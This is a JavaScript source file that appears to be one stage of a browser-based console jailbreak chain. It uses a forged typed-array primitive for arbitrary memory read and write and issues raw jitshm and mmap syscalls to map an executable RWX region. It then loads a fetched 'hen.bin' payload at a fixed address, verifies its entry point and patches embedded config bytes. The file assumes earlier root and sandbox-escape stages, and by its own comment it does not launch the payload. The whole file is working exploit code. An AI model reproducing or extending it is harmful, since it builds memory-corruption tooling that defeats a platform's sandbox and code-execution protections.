// Stage HEN map v1: place the reviewed hen.bin at 0x950000000 and verify it.
//
// Preconditions: uid=0 (stage_uid_v1), a jitshm RWX page (stage_jit_v1) and a
// sandbox-escaped process (stage_prison_v1). Hx1400 stage H does:
//   fd = jitshm_create(0, 589824, 7)
//   p  = mmap(0x950000000, 589824, 7, 17, fd, 0)   // MAP_FIXED|MAP_SHARED
// then copies HEN_SIZE bytes in, checks head 0xE9, entry 0x4AAB, a zero bss,
// and rewrites eight embedded config bytes. This probe does all of that but
// does NOT launch the payload.
//
// The image is written through the carrier: set its backing pointer to the
// target, write up to 64 KiB of bytes, restore. No ROP is involved.
var HEN_SIZE = 562240, HEN_ENTRY = 0x4aab, HEN_MAP = 0x950000000, HEN_SPAN = 589824;
var CFG = [
  [0xb811, 49], [0xb8ea, 49], [0xb9f8, 49], [0xbda0, 49],
  [0xbe54, 48], [0xccfa, 48], [0xce6d, 49], [0xd03e, 49]
];
var phase = "preflight";

function fail(message) {
  return [{ id: "stage_hen_map_v1", status: "error",
            details: { phase: phase, error: String(message).slice(0, 220) } }];
}

return (async function () {
  try {
    var n = window.__fw14NativeInvoke;
    var state = window.__fw14ArrayState;
    if (!n || !n.frame || !n.wrappers || !Number.isSafeInteger(n.frameAddress) ||
        !state || state.array[0] !== state.a || !state.view ||
        !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
        !Number.isInteger(state.index))
      throw new Error("caller_missing");
    var su = window.__fw14StageU, jit = window.__fw14StageJit;
    if (!su || su.uid !== 0) throw new Error("uid_missing");
    if (!jit || !Number.isSafeInteger(jit.addr) || jit.addr <= 0)
      throw new Error("jit_missing");
    var need = ["sys477", "sys533", "getpid", "sys24"];
    for (var mi = 0; mi < need.length; mi++)
      if (typeof n.wrappers[need[mi]] !== "number")
        throw new Error("wrappers_missing_" + need[mi]);

    var forged = state.view;
    var carrier = state.ownedTypedView;
    var base = state.calibratedViewBase;
    function bytesAt(index, count) {
      var out = [];
      for (var i = 0; i < count; i++) out.push(forged[index + i]);
      return out;
    }
    function valueOf(bytes) {
      var v = 0;
      for (var i = bytes.length - 1; i >= 0; i--) v = v * 256 + bytes[i];
      return v;
    }
    function pointerBytes(value) {
      var out = [];
      for (var i = 0; i < 8; i++)
        out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
      return out;
    }
    function addressOf(object) {
      try {
        state.array[0] = object;
        return valueOf(bytesAt(state.index, 8));
      } finally {
        state.array[0] = state.a;
      }
    }
    var carrierSlot = addressOf(carrier) - base + 8;
    if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
        carrierSlot + 8 >= 16777216)
      throw new Error("carrier_slot_invalid");
    var carrierOriginal = bytesAt(carrierSlot, 8);
    function setCarrier(addr) {
      var next = pointerBytes(addr);
      for (var i = 0; i < 8; i++) forged[carrierSlot + i] = next[i];
    }
    function restoreCarrier() {
      for (var i = 0; i < 8; i++)
        forged[carrierSlot + i] = carrierOriginal[i];
    }
    function poke(addr, bytes) {
      setCarrier(addr);
      for (var i = 0; i < bytes.length; i++) carrier[i] = bytes[i];
      restoreCarrier();
    }
    function peek(addr, count) {
      setCarrier(addr);
      var out = [];
      for (var i = 0; i < count; i++) out.push(carrier[i]);
      restoreCarrier();
      return out;
    }
    function isErr(r) {
      return !!r && r.value === -1 && (r.high >>> 0) === 0xffffffff;
    }
    function eTag(r) {
      if (!isErr(r)) return "v" + r.value;
      var e = n.readErrno();
      return "e" + (e === null ? r.value : e);
    }
    function hex2(b) { return ("0" + (b & 255).toString(16)).slice(-2); }
    function mark(m) {
      if (typeof api !== "undefined" && api && typeof api.markSync === "function")
        api.markSync(m);
    }

    var pid = n.call("getpid", []).value;
    var uidTag = eTag(n.call("sys24", []));

    // ------------------------------------------------------- fetch image
    phase = "fetch";
    mark("hen_fetch");
    var response = await fetch("/hen.bin", { cache: "no-store" });
    if (!response.ok) throw new Error("hen_http_" + response.status);
    var image = new Uint8Array(await response.arrayBuffer());
    if (image.length !== HEN_SIZE)
      throw new Error("hen_size_" + image.length);

    // ------------------------------------------------------- jitshm + mmap
    phase = "create";
    mark("hen_create");
    var jRes = n.call("sys533", [0, HEN_SPAN, 7, 0, 0, 0]);
    if (isErr(jRes) || jRes.value < 0) throw new Error("jitshm" + eTag(jRes));
    var jd = jRes.value;
    phase = "mmap_fixed";
    mark("hen_mmap_fixed");
    // The native caller returns a 64-bit result as {value, high}; the fixed
    // map is at 0x950000000, whose low dword is 0x50000000. Using `value`
    // alone writes into whatever lives at 0x50000000 and kills the process.
    function full64(r) {
      return (r.high >>> 0) * 0x100000000 + (r.value >>> 0);
    }
    var mRes = n.call("sys477", [HEN_MAP, HEN_SPAN, 7, 17, jd, 0]);
    var mapAddr = -1;
    if (!isErr(mRes) && mRes.value > 0) {
      var gotFixed = full64(mRes);
      if (gotFixed === HEN_MAP) mapAddr = gotFixed;
    }
    if (mapAddr < 0) {
      phase = "mmap_any";
      var aRes = n.call("sys477", [0, HEN_SPAN, 7, 1, jd, 0]);
      if (isErr(aRes) || aRes.value <= 0) throw new Error("mmap" + eTag(aRes));
      mapAddr = full64(aRes);
    }

    // ------------------------------------------------------- copy image in
    // Prove the reconstructed address is writable before touching 562 KiB.
    phase = "write_probe";
    mark("hen_write_probe");
    poke(mapAddr, [0xe9, 0x00, 0x00, 0x00, 0x00]);
    if (peek(mapAddr, 5).join(",") !== "233,0,0,0,0")
      throw new Error("map_write_probe_failed");
    phase = "write";
    mark("hen_write");
    var CHUNK = 65536;
    for (var off = 0; off < image.length; off += CHUNK) {
      var end = Math.min(off + CHUNK, image.length);
      setCarrier(mapAddr + off);
      for (var i = off; i < end; i++) carrier[i - off] = image[i];
      restoreCarrier();
    }

    // ------------------------------------------------------- verify image
    phase = "verify";
    mark("hen_verify");
    var head = peek(mapAddr, 8);
    var headOk = head[0] === 0xe9;
    var rel = (head[1] | (head[2] << 8) | (head[3] << 16) | (head[4] << 24)) >>> 0;
    var entry = 5 + rel;
    var bssNonZero = 0;
    for (var bi = HEN_SIZE; bi < HEN_SPAN; bi += 8)
      if (peek(mapAddr + bi, 8).join(",") !== "0,0,0,0,0,0,0,0") bssNonZero++;

    // ------------------------------------------------------- config bytes
    var cfgTag = [];
    for (var ci = 0; ci < CFG.length; ci++) {
      var before = peek(mapAddr + CFG[ci][0], 1)[0];
      if (before !== 48 && before !== 49) { cfgTag.push("!" + hex2(before)); continue; }
      poke(mapAddr + CFG[ci][0], [CFG[ci][1]]);
      var after = peek(mapAddr + CFG[ci][0], 1)[0];
      cfgTag.push((after === CFG[ci][1]) ? "ok" : "bad" + hex2(after));
    }

    // ------------------------------------------------------- outcome
    var post = n.call("getpid", []);
    var intact = post.value === pid && post.high === 0 &&
      state.array[0] === state.a &&
      bytesAt(carrierSlot, 8).join(",") === carrierOriginal.join(",");
    var ok = headOk && entry === HEN_ENTRY && bssNonZero === 0 && intact;
    window.__fw14StageHen = {
      mapped: ok, addr: mapAddr, size: image.length, entry: entry, fd: jd,
      pid: pid
    };
    return [{
      id: "stage_hen_map_v1",
      status: ok ? "pass" : "fail",
      details: {
        pid: pid, uid: uidTag, addr: "0x" + Math.floor(mapAddr).toString(16),
        size: image.length, head: hex2(head[0]),
        entry: "0x" + entry.toString(16), bss: String(bssNonZero),
        cfg: cfgTag.join(","), state: ok ? "mapped" : "bad", intact: intact
      }
    }];
  } catch (error) {
    return fail(error);
  }
})();
